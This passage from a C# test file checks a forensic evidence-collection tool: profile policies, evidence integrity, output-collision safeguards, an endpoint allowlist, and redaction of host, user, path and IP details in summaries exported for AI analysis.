                File.WriteAllText(Path.Combine(dir, ArtifactNames.SystemInfoTxt), "ok", new UTF8Encoding(false));
                CollectionCoverageReport report = InvokeBuildCollectionCoverageReport(dir, "CaseB", new List<string>(), CollectionModeProfileHelper.ForensicStrict);
                return report != null &&
                    string.Equals(report.CollectionModeProfile, CollectionModeProfileHelper.ForensicStrict, StringComparison.Ordinal);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool CollectionImpactPolicy_classifies_system_network_and_unknown_targets()
        {
            string systemTarget = Path.Combine(Environment.SystemDirectory, "IR_Output_policy_test");
            return string.Equals(
                    CollectionImpactPolicy.ClassifyOutputTarget(systemTarget),
                    CollectionImpactPolicy.OutputSystemDisk,
                    StringComparison.Ordinal) &&
                string.Equals(
                    CollectionImpactPolicy.ClassifyOutputTarget(@"\\server\share\case"),
                    CollectionImpactPolicy.OutputNetwork,
                    StringComparison.Ordinal) &&
                string.Equals(
                    CollectionImpactPolicy.ClassifyOutputTarget(""),
                    CollectionImpactPolicy.OutputUnknown,
                    StringComparison.Ordinal);
        }

        private static bool CollectionImpactPolicy_strict_restricts_enabled_high_impact_steps()
        {
            CollectionRunContext context = CollectionImpactPolicy.CreateForValues(
                CollectionModeProfileHelper.ForensicStrict,
                Path.Combine(Environment.SystemDirectory, "IR_Output_policy_test"),
                true,
                true,
                true,
                true,
                true);

            return context.OperatorAcknowledgedRisks &&
                string.Equals(context.OutputTargetClass, CollectionImpactPolicy.OutputSystemDisk, StringComparison.Ordinal) &&
                context.RestrictedSteps.SequenceEqual(new[]
                {
                    CollectionImpactPolicy.MemoryAcquisitionStep,
                    CollectionImpactPolicy.MemoryAnalysisStep,
                    CollectionImpactPolicy.DeepScanStep
                }) &&
                context.SkippedByProfile.SequenceEqual(new[]
                {
                    CollectionImpactPolicy.MemoryAcquisitionStep,
                    CollectionImpactPolicy.MemoryAnalysisStep
                }) &&
                CollectionImpactPolicy.RequiresOperatorAcknowledgment(context);
        }

        private static bool CollectionImpactPolicy_standard_does_not_restrict_steps()
        {
            CollectionRunContext context = CollectionImpactPolicy.CreateForValues(
                CollectionModeProfileHelper.Standard,
                Path.Combine(Environment.SystemDirectory, "IR_Output_policy_test"),
                false,
                true,
                true,
                true,
                true);

            return context.RestrictedSteps.Count == 0 &&
                context.SkippedByProfile.Count == 0 &&
                !CollectionImpactPolicy.RequiresOperatorAcknowledgment(context);
        }

        private static bool Collector_forensic_strict_without_acknowledgment_is_rejected_before_collection()
        {
            CollectionRunContext context = CollectionImpactPolicy.CreateForValues(
                CollectionModeProfileHelper.ForensicStrict,
                Path.Combine(Environment.SystemDirectory, "IR_Output_policy_test"),
                false,
                true,
                true,
                true,
                true);
            try
            {
                Collector.ValidateCollectionRunContext(context);
                return false;
            }
            catch (InvalidOperationException ex)
            {
                return (ex.Message ?? "").IndexOf("risk acknowledgment", StringComparison.OrdinalIgnoreCase) >= 0;
            }
        }

        private static bool CollectionCoverage_forensic_policy_metadata_round_trips_and_marks_partial()
        {
            string dir = CreateTempDir("IRCollectStrictCoverage_");
            try
            {
                File.WriteAllText(Path.Combine(dir, ArtifactNames.SystemInfoTxt), "ok", new UTF8Encoding(false));
                CollectionRunContext context = CollectionImpactPolicy.CreateForValues(
                    CollectionModeProfileHelper.ForensicStrict,
                    dir,
                    true,
                    true,
                    true,
                    true,
                    true);
                CollectionCoverageReport report = Collector.BuildCollectionCoverageReportForPolicy(
                    dir,
                    "StrictCase",
                    new List<string>(),
                    context);
                string path = Path.Combine(dir, ArtifactNames.CollectionCoverageJson);
                CollectionCoverageSerializer.SaveToFile(report, path);
                CollectionCoverageReport loaded = CollectionCoverageSerializer.LoadFromFile(path);

                return loaded != null &&
                    string.Equals(loaded.CollectionModeProfile, CollectionModeProfileHelper.ForensicStrict, StringComparison.Ordinal) &&
                    loaded.OperatorAcknowledgedRisks &&
                    string.Equals(loaded.OutputTargetClass, context.OutputTargetClass, StringComparison.Ordinal) &&
                    loaded.RestrictedSteps.SequenceEqual(context.RestrictedSteps) &&
                    loaded.SkippedByProfile.SequenceEqual(context.SkippedByProfile) &&
                    string.Equals(loaded.OverallStatus, "partial", StringComparison.OrdinalIgnoreCase);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool MemoryCollectors_run_policy_writes_skipped_sidecars_without_tools()
        {
            string dir = CreateTempDir("IRCollectStrictMemory_");
            try
            {
                MemoryAcquisitionCollector.Collect(dir, true);
                MemoryAnalysisCollector.Collect(dir, true);
                MemoryAcquisitionRecord acquisition = MemoryAcquisitionRecord.TryLoad(
                    Path.Combine(dir, ArtifactNames.MemoryAcquisitionJson));
                MemoryAnalysisRecord analysis = MemoryAnalysisRecord.TryLoad(
                    Path.Combine(dir, ArtifactNames.MemoryAnalysisJson));

                return acquisition != null &&
                    analysis != null &&
                    string.Equals(acquisition.Status, "skipped", StringComparison.OrdinalIgnoreCase) &&
                    string.Equals(analysis.Status, "skipped", StringComparison.OrdinalIgnoreCase) &&
                    (acquisition.Detail ?? "").IndexOf("ForensicStrict", StringComparison.Ordinal) >= 0 &&
                    (analysis.Detail ?? "").IndexOf("ForensicStrict", StringComparison.Ordinal) >= 0 &&
                    string.IsNullOrEmpty(acquisition.ToolPath) &&
                    string.IsNullOrEmpty(analysis.ToolPath);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool CollectionResult_profile_skip_sets_coverage_gap()
        {
            var result = new Collector.CollectionResult
            {
                FailedSteps = new List<string>(),
                CoverageReport = new CollectionCoverageReport
                {
                    OverallStatus = "partial",
                    SkippedByProfile = new List<string> { CollectionImpactPolicy.MemoryAcquisitionStep },
                    Steps = new List<CollectionCoverageStep>()
                }
            };
            return result.HasCoverageGaps && !result.HasErrors;
        }

        private static bool ZipUpload_gate_uses_run_profile_ForensicStrict_even_if_settings_Standard()
        {
            var cfg = new ConfigManager();
            cfg.Set("CollectionModeProfile", CollectionModeProfileHelper.Standard);
            return CollectionModeProfileHelper.BlocksOutboundZipUploadForLocalCollectRun(CollectionModeProfileHelper.ForensicStrict, cfg) &&
                !CollectionModeProfileHelper.BlocksOutboundZipUpload(cfg);
        }

        private static bool ZipUpload_gate_run_Standard_not_blocked_when_settings_ForensicStrict()
        {
            var cfg = new ConfigManager();
            cfg.Set("CollectionModeProfile", CollectionModeProfileHelper.ForensicStrict);
            return !CollectionModeProfileHelper.BlocksOutboundZipUploadForLocalCollectRun(CollectionModeProfileHelper.Standard, cfg) &&
                !CollectionModeProfileHelper.BlocksOutboundZipUploadForLocalCollectRun("", cfg) &&
                CollectionModeProfileHelper.BlocksOutboundZipUpload(cfg);
        }

        private static bool ZipUpload_gate_null_run_falls_back_to_settings_ForensicStrict()
        {
            var cfg = new ConfigManager();
            cfg.Set("CollectionModeProfile", CollectionModeProfileHelper.ForensicStrict);
            return CollectionModeProfileHelper.BlocksOutboundZipUploadForLocalCollectRun(null, cfg) &&
                CollectionModeProfileHelper.BlocksOutboundZipUpload(cfg);
        }

        private static bool Dashboard_loaded_case_profiles_line_mixed()
        {
            var list = new List<string> { CollectionModeProfileHelper.Standard, CollectionModeProfileHelper.ForensicStrict, null };
            string line = CollectionModeProfileHelper.FormatDashboardLoadedCollectionProfilesLine(list);
            return line.IndexOf("Mixed", StringComparison.Ordinal) >= 0 &&
                line.IndexOf("ForensicStrict", StringComparison.Ordinal) >= 0 &&
                line.IndexOf("Standard", StringComparison.Ordinal) >= 0 &&
                line.IndexOf("lack recorded profile", StringComparison.Ordinal) >= 0;
        }

        private static bool Dashboard_loaded_case_profiles_line_all_unlabeled()
        {
            var list = new List<string> { null, null };
            string line = CollectionModeProfileHelper.FormatDashboardLoadedCollectionProfilesLine(list);
            return line.IndexOf("not recorded", StringComparison.Ordinal) >= 0;
        }

        private static bool Dashboard_loaded_case_profiles_line_single()
        {
            var list = new List<string> { CollectionModeProfileHelper.TriageFast };
            string line = CollectionModeProfileHelper.FormatDashboardLoadedCollectionProfilesLine(list);
            return line.IndexOf("Loaded case collection profiles: TriageFast", StringComparison.Ordinal) >= 0 &&
                line.IndexOf("Mixed", StringComparison.Ordinal) < 0;
        }

        private static bool Collector_output_collision_preserves_existing_evidence()
        {
            string work = CreateTempDir("IRCollectOutputCollision_");
            try
            {
                string outputDir = Path.Combine(work, "IR_Output_CASE-1");
                string zipPath = Path.Combine(work, "CASE-1.zip");
                string shaPath = zipPath + ".sha256";
                Directory.CreateDirectory(outputDir);
                string marker = Path.Combine(outputDir, "existing.txt");
                File.WriteAllText(marker, "existing", new UTF8Encoding(false));
                byte[] originalZip = new byte[] { 1, 2, 3, 4 };
                File.WriteAllBytes(zipPath, originalZip);
                File.WriteAllText(shaPath, "old-hash", new UTF8Encoding(false));

                bool targetsRejected = false;
                try { Collector.ValidateCollectionOutputTargets(outputDir, zipPath, shaPath); }
                catch (IOException) { targetsRejected = true; }

                string source = Path.Combine(work, "source");
                Directory.CreateDirectory(source);
                File.WriteAllText(Path.Combine(source, "new.txt"), "new", new UTF8Encoding(false));
                bool packRejected = false;
                try { Collector.PackDir(source, zipPath); }
                catch (IOException) { packRejected = true; }

                bool shaPublishRejected = false;
                try { Collector.WriteNewTextAtomic(shaPath, "new-hash"); }
                catch (IOException) { shaPublishRejected = true; }

                string claimedDirectory = Path.Combine(work, "claimed");
                Collector.CreateCollectionOutputDirectory(claimedDirectory);
                bool directoryClaimRejected = false;
                try { Collector.CreateCollectionOutputDirectory(claimedDirectory); }
                catch (IOException) { directoryClaimRejected = true; }

                return targetsRejected && packRejected && shaPublishRejected && directoryClaimRejected &&
                    File.ReadAllText(marker) == "existing" &&
                    File.ReadAllBytes(zipPath).SequenceEqual(originalZip) &&
                    File.ReadAllText(shaPath) == "old-hash";
            }
            finally
            {
                TryDeleteDir(work);
            }
        }

        private static bool EvidenceManifest_rejects_reparse_attributes()
        {
            return EvidenceManifest.IsRejectedReparsePoint(FileAttributes.ReparsePoint) &&
                EvidenceManifest.IsRejectedReparsePoint(FileAttributes.Directory | FileAttributes.ReparsePoint) &&
                !EvidenceManifest.IsRejectedReparsePoint(FileAttributes.Normal) &&
                !EvidenceManifest.IsRejectedReparsePoint(FileAttributes.Directory);
        }

        private static bool EvidenceManifest_missing_root_is_incomplete()
        {
            EvidenceManifestResult manifest = EvidenceManifest.HashFolder(
                Path.Combine(Path.GetTempPath(), "IRCollectMissingEvidence_" + Guid.NewGuid().ToString("N")));
            return manifest != null && !manifest.IsComplete && manifest.Warnings.Any(x =>
                x.IndexOf("missing", StringComparison.OrdinalIgnoreCase) >= 0);
        }

        private static bool AnalyzeFolder_source_change_is_rejected_before_fact_build()
        {
            string dir = CreateTempDir("IRCollectEvidenceMutation_");
            CaseData c = null;
            try
            {
                string path = Path.Combine(dir, ArtifactNames.ProcessListCsv);
                string header = "PID,Name,Path,CommandLine,StartTime,User,SHA256,SignatureStatus,Signer,PPID,SessionId,ThreadCount,WorkingSetSize\r\n";
                string before = header + "100,good.exe,C:\\Temp\\good.exe,,,,,,,,,,,\r\n";
                string after = header + "100,evil.exe,C:\\Temp\\evil.exe,,,,,,,,,,,\r\n";
                if (before.Length != after.Length) return false;
                File.WriteAllText(path, before, new UTF8Encoding(false));
                c = CaseManager.LoadCaseFromFolder(dir);
                File.WriteAllText(path, after, new UTF8Encoding(false));

                try
                {
                    FactStoreBuildCoordinator.Build(c, false, false);
                    return false;
                }
                catch (InvalidDataException ex)
                {
                    return ex.Message.IndexOf("changed after", StringComparison.OrdinalIgnoreCase) >= 0;
                }
            }
            finally
            {
                if (c != null) CaseManager.RemoveCase(c);
                TryDeleteDir(dir);
            }
        }

        private static bool AnalyzeFolder_missing_source_is_rejected_before_fact_build()
        {
            string dir = CreateTempDir("IRCollectEvidenceMissing_");
            string moved = dir + "_moved";
            CaseData c = null;
            try
            {
                File.WriteAllText(Path.Combine(dir, ArtifactNames.ProcessListCsv),
                    "PID,Name,Path\r\n100,good.exe,C:\\Temp\\good.exe\r\n", new UTF8Encoding(false));
                c = CaseManager.LoadCaseFromFolder(dir);
                Directory.Move(dir, moved);

                try
                {
                    FactStoreBuildCoordinator.Build(c, false, false);
                    return false;
                }
                catch (InvalidDataException ex)
                {
                    return ex.Message.IndexOf("no longer available", StringComparison.OrdinalIgnoreCase) >= 0;
                }
            }
            finally
            {
                if (c != null) CaseManager.RemoveCase(c);
                TryDeleteDir(dir);
                TryDeleteDir(moved);
            }
        }

        private static bool AnalyzeFolder_preexisting_fact_store_is_not_trusted()
        {
            string dir = CreateTempDir("IRCollectUntrustedDb_");
            CaseData c = null;
            try
            {
                File.WriteAllText(Path.Combine(dir, ArtifactNames.SystemInfoTxt),
                    "Hostname: DB-TEST\r\n", new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(dir, ArtifactNames.FactStoreDb),
                    "not-a-trusted-cache", new UTF8Encoding(false));
                c = CaseManager.LoadCaseFromFolder(dir);
                return c.FactStore == null &&
                    string.Equals(c.FactStoreFreshnessStatus, "untrusted_source", StringComparison.Ordinal) &&
                    c.LoadWarnings.Any(x => x.IndexOf("not trusted", StringComparison.OrdinalIgnoreCase) >= 0);
            }
            finally
            {
                if (c != null) CaseManager.RemoveCase(c);
                TryDeleteDir(dir);
            }
        }

        private static bool AnalyzeFolder_uac_preexisting_fact_store_is_not_trusted()
        {
            string dir = CreateTempDir("IRCollectUacUntrustedDb_");
            CaseData c = null;
            try
            {
                File.WriteAllText(Path.Combine(dir, "uac.log"),
                    "2026-08-16 01:02:03 +0000 INF Operating system: linux\r\n" +
                    "2026-08-16 01:02:03 +0000 INF Hostname: UAC-DB-TEST\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(dir, ArtifactNames.FactStoreDb),
                    "not-a-trusted-cache", new UTF8Encoding(false));

                c = CaseManager.LoadCaseFromFolder(dir);
                return c.UacEvidence != null && c.UacEvidence.IsUac && c.FactStore == null &&
                    string.Equals(c.FactStoreFreshnessStatus, "untrusted_source", StringComparison.Ordinal) &&
                    c.LoadWarnings.Any(x => x.IndexOf("fact_store.db", StringComparison.OrdinalIgnoreCase) >= 0 &&
                        x.IndexOf("not trusted", StringComparison.OrdinalIgnoreCase) >= 0);
            }
            finally
            {
                if (c != null) CaseManager.RemoveCase(c);
                TryDeleteDir(dir);
            }
        }

        private static bool AnalyzeArchive_preexisting_fact_store_is_not_trusted()
        {
            string dir = CreateTempDir("IRCollectUntrustedArchiveDb_");
            CaseData c = null;
            try
            {
                string zip = Path.Combine(dir, "case.zip");
                using (FileStream fs = new FileStream(zip, FileMode.Create, FileAccess.Write, FileShare.None))
                using (var archive = new ZipArchive(fs, ZipArchiveMode.Create))
                {
                    ZipArchiveEntry systemInfo = archive.CreateEntry(ArtifactNames.SystemInfoTxt, CompressionLevel.Fastest);
                    using (var writer = new StreamWriter(systemInfo.Open(), new UTF8Encoding(false)))
                        writer.Write("Hostname: ARCHIVE-DB-TEST\r\n");
                    ZipArchiveEntry database = archive.CreateEntry(ArtifactNames.FactStoreDb, CompressionLevel.Fastest);
                    using (var writer = new StreamWriter(database.Open(), new UTF8Encoding(false)))
                        writer.Write("not-a-trusted-cache");
                }

                c = CaseManager.LoadCase(zip);
                return c.FactStore == null &&
                    string.Equals(c.FactStoreFreshnessStatus, "untrusted_source", StringComparison.Ordinal) &&
                    c.LoadWarnings.Any(x => x.IndexOf("not trusted", StringComparison.OrdinalIgnoreCase) >= 0);
            }
            finally
            {
                if (c != null) CaseManager.RemoveCase(c);
                TryDeleteDir(dir);
            }
        }

        private static bool CorrelationCsvHelper_large_file_records_load_warning()
        {
            string dir = CreateTempDir("IRCollectLargeCsv_");
            try
            {
                string path = Path.Combine(dir, "large.csv");
                using (var stream = new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.None))
                    stream.SetLength(100L * 1024L * 1024L + 1L);

                CorrelationCsvHelper.ResetDiagnostics();
                List<Dictionary<string, string>> rows = CorrelationCsvHelper.ReadCsv(path);
                var c = new CaseData();
                FactStore.AppendCsvDiagnostics(c);
                return rows.Count == 0 && c.LoadWarnings.Any(x =>
                    x.IndexOf("exceeds 100 MiB", StringComparison.OrdinalIgnoreCase) >= 0);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool CorrelationCsvHelper_row_limit_boundary_is_stable()
        {
            return !CorrelationCsvHelper.ExceedsRowLimit(500000) &&
                CorrelationCsvHelper.ExceedsRowLimit(500001);
        }

        private static bool CollectionExitCode_distinguishes_errors_gaps_and_success()
        {
            var success = new Collector.CollectionResult
            {
                FailedSteps = new List<string>(),
                CoverageReport = new CollectionCoverageReport()
            };
            var error = new Collector.CollectionResult
            {
                FailedSteps = new List<string> { "MFT" },
                CoverageReport = new CollectionCoverageReport()
            };
            var gap = new Collector.CollectionResult
            {
                FailedSteps = new List<string>(),
                CoverageReport = new CollectionCoverageReport { PartialSteps = 1 }
            };
            return Program.GetCollectionExitCode(null) == 1 &&
                Program.GetCollectionExitCode(success) == 0 &&
                Program.GetCollectionExitCode(error) == 2 &&
                Program.GetCollectionExitCode(gap) == 4;
        }

        private static bool AnalysisClis_output_failure_returns_nonzero()
        {
            string work = CreateTempDir("IRCollectCliOutput_");
            string a = Path.Combine(work, "a");
            string b = Path.Combine(work, "b");
            try
            {
                Directory.CreateDirectory(a);
                Directory.CreateDirectory(b);
                File.WriteAllText(Path.Combine(a, ArtifactNames.SystemInfoTxt), "Hostname: CLI-A\r\n", new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(b, ArtifactNames.SystemInfoTxt), "Hostname: CLI-B\r\n", new UTF8Encoding(false));
                var output = new StringWriter(CultureInfo.InvariantCulture);
                int analyze = AnalysisCli.Run(a, work, output);
                int correlate = CorrelationCli.Run(new List<string> { a, b }, work, null, output);
                int graph = GraphCli.Run("Path", "C:\\Temp\\none.exe", 1, work,
                    new List<string> { a }, output);
                return analyze != 0 && correlate != 0 && graph != 0 &&
                    output.ToString().IndexOf("not written", StringComparison.OrdinalIgnoreCase) >= 0;
            }
            finally
            {
                CaseManager.CleanupAll();
                TryDeleteDir(work);
            }
        }

        private static string CreateTempDir(string prefix)
        {
            string dir = Path.Combine(Path.GetTempPath(), prefix + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(dir);
            return dir;
        }

        private static void WriteEventLogCsv(string path, IEnumerable<string[]> rows)
        {
            var sb = new StringBuilder();
            sb.AppendLine("TimeCreated,EventId,LevelDisplayName,ProviderName,Computer,UserId,TaskDisplayName,Message,EventData");
            foreach (string[] row in rows)
            {
                for (int i = 0; i < row.Length; i++)
                {
                    if (i > 0) sb.Append(",");
                    sb.Append(CsvUtils.EscapeField(row[i] ?? ""));
                }
                sb.AppendLine();
            }
            File.WriteAllText(path, sb.ToString(), new UTF8Encoding(false));
        }

        private static string[] BuildEventLogRow(string timeCreated, string eventId, string providerName, string message, string eventData)
        {
            return new[]
            {
                timeCreated ?? "",
                eventId ?? "",
                "Information",
                providerName ?? "",
                "HOST01",
                "",
                "",
                message ?? "",
                eventData ?? ""
            };
        }

        private static bool EndpointGovernance_empty_allowlist_blocks()
        {
            return !EndpointGovernance.IsEndpointAllowed("https://example.com/a", "") &&
                !EndpointGovernance.IsEndpointAllowed("https://example.com/a", "   ");
        }

        private static bool EndpointGovernance_prefix_allows_child_path()
        {
            const string allow = "https://api.example.com/v1";
            return EndpointGovernance.IsEndpointAllowed("https://api.example.com/v1/chat", allow) &&
                EndpointGovernance.IsEndpointAllowed("https://api.example.com/v1", allow) &&
                !EndpointGovernance.IsEndpointAllowed("https://api.example.com/v2/chat", allow);
        }

        private static bool EndpointGovernance_different_host_rejected()
        {
            return !EndpointGovernance.IsEndpointAllowed("https://evil.example.com/v1/a", "https://api.example.com/v1");
        }

        private static bool EndpointGovernance_path_case_mismatch_rejected()
        {
            const string allow = "https://api.example.com/API/v1";
            return !EndpointGovernance.IsEndpointAllowed("https://api.example.com/api/v1/chat", allow) &&
                EndpointGovernance.IsEndpointAllowed("https://api.example.com/API/v1/chat", allow);
        }

        private static bool AiRedaction_basic_masks_collection_coverage_identity()
        {
            var live = new CollectionCoverageReport
            {
                Host = "SECRET-HOSTNAME",
                EvidenceId = "E-SECRET-001",
                CollectorUser = @"DOMAIN\secret.user",
                OverallStatus = "complete",
                CollectionModeProfile = CollectionModeProfileHelper.ForensicStrict,
                OperatorAcknowledgedRisks = true,
                OutputTargetClass = CollectionImpactPolicy.OutputSystemDisk,
                RestrictedSteps = new List<string> { CollectionImpactPolicy.DeepScanStep },
                SkippedByProfile = new List<string> { CollectionImpactPolicy.MemoryAcquisitionStep },
                Steps = new List<CollectionCoverageStep>()
            };
            var payload = new SummaryPayload
            {
                ExportSchema = "summary_v3",
                CollectionCoverage = live,
                FactSamples = new List<Fact>()
            };
            var copy = SummaryExport.CloneForSerialization(payload);
            SummaryPayloadAiRedactor.Apply(copy, "Basic");
            string json = SummaryExport.Serialize(copy);
            bool liveIntact =
                string.Equals(live.Host, "SECRET-HOSTNAME", StringComparison.Ordinal) &&
                string.Equals(live.EvidenceId, "E-SECRET-001", StringComparison.Ordinal) &&
                string.Equals(live.CollectorUser, @"DOMAIN\secret.user", StringComparison.Ordinal) &&
                string.Equals(live.CollectionModeProfile, CollectionModeProfileHelper.ForensicStrict, StringComparison.Ordinal) &&
                live.OperatorAcknowledgedRisks &&
                live.RestrictedSteps.SequenceEqual(new[] { CollectionImpactPolicy.DeepScanStep }) &&
                live.SkippedByProfile.SequenceEqual(new[] { CollectionImpactPolicy.MemoryAcquisitionStep });
            bool jsonRedacted =
                json.IndexOf("SECRET-HOSTNAME", StringComparison.OrdinalIgnoreCase) < 0 &&
                json.IndexOf("E-SECRET-001", StringComparison.OrdinalIgnoreCase) < 0 &&
                json.IndexOf("secret.user", StringComparison.OrdinalIgnoreCase) < 0 &&
                json.IndexOf("[redacted]", StringComparison.OrdinalIgnoreCase) >= 0 &&
                json.IndexOf("\"collection_mode_profile\":\"ForensicStrict\"", StringComparison.Ordinal) >= 0 &&
                json.IndexOf("\"output_target_class\":\"system_disk\"", StringComparison.Ordinal) >= 0 &&
                json.IndexOf("Deep Scan (manual live action)", StringComparison.Ordinal) >= 0;
            return liveIntact && jsonRedacted;
        }

        private static bool AiRedaction_basic_masks_top_level_host_case_id()
        {
            var p = new SummaryPayload
            {
                ExportSchema = "summary_v3",
                Host = "TOP-SHOST-99",
                CaseId = "CASE-TOP-001",
                FactSamples = new List<Fact>()
            };
            var copy = SummaryExport.CloneForSerialization(p);
            SummaryPayloadAiRedactor.Apply(copy, "Basic");
            string json = SummaryExport.Serialize(copy);
            return string.Equals(p.Host, "TOP-SHOST-99", StringComparison.Ordinal) &&
                string.Equals(p.CaseId, "CASE-TOP-001", StringComparison.Ordinal) &&
                json.IndexOf("TOP-SHOST-99", StringComparison.OrdinalIgnoreCase) < 0 &&
                json.IndexOf("CASE-TOP-001", StringComparison.OrdinalIgnoreCase) < 0 &&
                json.IndexOf("\"host\":\"[redacted]\"", StringComparison.OrdinalIgnoreCase) >= 0;
        }

        private static bool AiRedaction_basic_masks_memory_collector_user()
        {
            const string collector = @"ACME-DOMAIN\collector.operator";
            var acq = new MemoryAcquisitionRecord { ToolArgs = "x", Status = "complete", CollectorUser = collector };
            var pyld = new MemoryAnalysisRecord { Status = "skipped", Detail = "n/a", CollectorUser = collector };
            var payload = new SummaryPayload
            {
                ExportSchema = "summary_v3",
                MemoryAcquisition = acq,
                MemoryAnalysis = pyld,
                FactSamples = new List<Fact>()
            };
            var copy = SummaryExport.CloneForSerialization(payload);
            SummaryPayloadAiRedactor.Apply(copy, "Basic");
            string json = SummaryExport.Serialize(copy);
            bool liveOk = string.Equals(acq.CollectorUser, collector, StringComparison.Ordinal) &&
                string.Equals(pyld.CollectorUser, collector, StringComparison.Ordinal);
            bool jsonOk = json.IndexOf("ACME-DOMAIN", StringComparison.OrdinalIgnoreCase) < 0 &&
                json.IndexOf("collector.operator", StringComparison.OrdinalIgnoreCase) < 0 &&
                json.IndexOf("user_redacted", StringComparison.OrdinalIgnoreCase) >= 0;
            return liveOk && jsonOk;
        }

        private static bool AiRedaction_basic_masks_fact_details_unc_paths_live_untouched()
        {
            Fact live = CreateFact("F1", DateTime.UtcNow, "EventLog", "Observed", "Path", @"C:\Windows\System32\notepad.exe");
            const string secretDetails = @"Loaded module from \\FILESERVER01.contoso.lan\Shares\tools\payload.dll";
            live.Details = secretDetails;
            var payload = new SummaryPayload
            {
                ExportSchema = "summary_v3",
                FactSamples = new List<Fact> { live }
            };
            var copy = SummaryExport.CloneForSerialization(payload);
            SummaryPayloadAiRedactor.Apply(copy, "Basic");
            string json = SummaryExport.Serialize(copy);
            bool liveIntact = string.Equals(live.Details, secretDetails, StringComparison.Ordinal);
            bool jsonOk = json.IndexOf("FILESERVER01", StringComparison.OrdinalIgnoreCase) < 0 &&
                json.IndexOf("path_redacted", StringComparison.OrdinalIgnoreCase) >= 0;
            return liveIntact && jsonOk;
        }

        private static bool AiRedaction_basic_masks_workflow_notes_paths_live_untouched()
        {
            const string notes = @"Reviewer: check C:\Cases\2026\Host-A\Evtx\Security.evtx before pivot.";
            var wf = new AnalystWorkflowState { Notes = notes, Hypothesis = "h" };
            var payload = new SummaryPayload
            {
                ExportSchema = "summary_v3",
                AnalystWorkflow = wf,
                FactSamples = new List<Fact>()
            };
            var copy = SummaryExport.CloneForSerialization(payload);
            SummaryPayloadAiRedactor.Apply(copy, "Basic");
            string json = SummaryExport.Serialize(copy);
            bool liveIntact = string.Equals(wf.Notes, notes, StringComparison.Ordinal);
            bool jsonOk = json.IndexOf(@"Cases\2026", StringComparison.OrdinalIgnoreCase) < 0 &&
                json.IndexOf("path_redacted", StringComparison.OrdinalIgnoreCase) >= 0;
            return liveIntact && jsonOk;
        }

        private static bool AiRedaction_basic_masks_memory_toolargs_paths()
        {
            const string secretArgs = @"C:\Users\alice\AppData\Local\tool.exe --out D:\IR_Output\case1\memory.raw %USERPROFILE%\x";
            var acq = new MemoryAcquisitionRecord { ToolArgs = secretArgs, Status = "complete" };
            var payload = new SummaryPayload
            {
                ExportSchema = "summary_v3",
                MemoryAcquisition = acq,
                FactSamples = new List<Fact>()
            };
            var copy = SummaryExport.CloneForSerialization(payload);
            SummaryPayloadAiRedactor.Apply(copy, "Basic");
            string json = SummaryExport.Serialize(copy);
            bool liveArgsUnchanged = (acq.ToolArgs ?? "").IndexOf(@"C:\Users\alice", StringComparison.Ordinal) >= 0;
            bool jsonNoLeak =
                json.IndexOf(@"C:\Users\alice", StringComparison.OrdinalIgnoreCase) < 0 &&
                json.IndexOf(@"D:\IR_Output", StringComparison.OrdinalIgnoreCase) < 0 &&
                json.IndexOf("path_redacted", StringComparison.OrdinalIgnoreCase) >= 0 &&
                json.IndexOf("env_redacted", StringComparison.OrdinalIgnoreCase) >= 0;
            return liveArgsUnchanged && jsonNoLeak;
        }

        private static bool AiRedaction_basic_masks_fact_store_inputs_live_untouched()
        {
            const string relativePath = "evidence/Users/alice/AppData/Local/Temp/process_list.csv";
            var liveInput = new FactStoreInputFingerprint
            {
                RelativePath = relativePath,
                Size = 123,
                MtimeUtc = DateTime.UtcNow.ToString("o"),
                Sha256 = new string('b', 64),
                NormalizerName = "Process"
            };
            var payload = new SummaryPayload
            {
                ExportSchema = "summary_v3",
                FactStoreBuildInputs = new List<FactStoreInputFingerprint> { liveInput },
                FactSamples = new List<Fact>()
            };
            var copy = SummaryExport.CloneForSerialization(payload);
            SummaryPayloadAiRedactor.Apply(copy, "Basic");
            string json = SummaryExport.Serialize(copy);
            return string.Equals(liveInput.RelativePath, relativePath, StringComparison.Ordinal) &&
                json.IndexOf("Users/alice", StringComparison.OrdinalIgnoreCase) < 0 &&
                json.IndexOf("process_list.csv", StringComparison.OrdinalIgnoreCase) >= 0;
        }

        private static bool AiRedaction_strict_clears_fact_samples()
        {
            var payload = new SummaryPayload
            {
                Host = "HOST01",
                CaseId = "CID",
                ExportSchema = "summary_v3",
                FactSamples = new List<Fact> { CreateFact("F1", DateTime.UtcNow, "USN", "Observed", "Path", @"C:\secret\x.txt") },
                EventHighlights = new List<string> { "hi" }
            };
            var copy = SummaryExport.CloneForSerialization(payload);
            SummaryPayloadAiRedactor.Apply(copy, "Strict");
            string json = SummaryExport.Serialize(copy);
            return (copy.FactSamples == null || copy.FactSamples.Count == 0) &&
                json.IndexOf("HOST01", StringComparison.OrdinalIgnoreCase) < 0 &&
                json.IndexOf("x.txt", StringComparison.OrdinalIgnoreCase) < 0;
        }

        private static bool AiRedaction_basic_masks_ipv4_in_highlights()
        {
            var payload = new SummaryPayload
            {
                ExportSchema = "summary_v3",
                EventHighlights = new List<string> { "User from 192.168.1.10 logged on" }
            };
            var copy = SummaryExport.CloneForSerialization(payload);
            SummaryPayloadAiRedactor.Apply(copy, "Basic");
            string json = SummaryExport.Serialize(copy);
            return json.IndexOf("192.168.1.10", StringComparison.OrdinalIgnoreCase) < 0 &&
                json.IndexOf("[ipv4]", StringComparison.OrdinalIgnoreCase) >= 0;
        }

        private static bool AiRedaction_none_unchanged_highlight()
        {
            var payload = new SummaryPayload
            {
                ExportSchema = "summary_v3",
                EventHighlights = new List<string> { "User from 192.168.1.10 logged on" }
            };
            var copy = SummaryExport.CloneForSerialization(payload);
            SummaryPayloadAiRedactor.Apply(copy, "None");
            string json = SummaryExport.Serialize(copy);
            return json.IndexOf("192.168.1.10", StringComparison.OrdinalIgnoreCase) >= 0;
        }

        private static CaseData CreateSyntheticCase(string host, params Fact[] facts)
        {
            var c = new CaseData();
            c.Hostname = host;
            c.CaseID = host + "_Case";
            c.ExtractPath = Path.Combine(Path.GetTempPath(), "IRCollectSyntheticCase_" + Guid.NewGuid().ToString("N"));
